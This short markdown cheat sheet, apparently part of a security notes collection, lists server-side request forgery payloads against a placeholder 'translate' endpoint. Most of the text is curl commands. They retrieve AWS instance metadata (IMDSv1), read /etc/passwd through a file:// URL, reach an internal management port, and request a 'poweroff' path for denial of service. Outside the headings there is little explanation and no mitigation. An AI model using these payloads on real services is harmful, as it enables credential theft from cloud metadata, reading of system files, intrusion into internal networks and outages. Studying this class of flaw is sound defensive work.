# SSRF

## Table of Contents
- [Access Control Bypass](#access-control-bypass)

## Access Control Bypass

### Access controls implemented in the service can be bypassed, leading to data leakage.

- Retrieving instance metadata from cloud services [^1]
   ```bash
   curl https://[VULNERABLE-SERVICE]/translate?url=http://169.254.169.254/latest/meta-data/
   ```

- Read arbitrary files from the file system
   ```bash
   curl https://[VULNERABLE-SERVICE]/translate?url=file:///etc/passwd
   ```

- Access to the internal network
   ```bash
   curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/management
   ```

### It is possible to interact with internal services

- DOS
   ```bash
   curl https://[VULNERABLE-SERVICE]/translate?url=http://127.0.0.1:8888/poweroff
   ```
      
[^1]: Based on IMDSv1 (AWS)
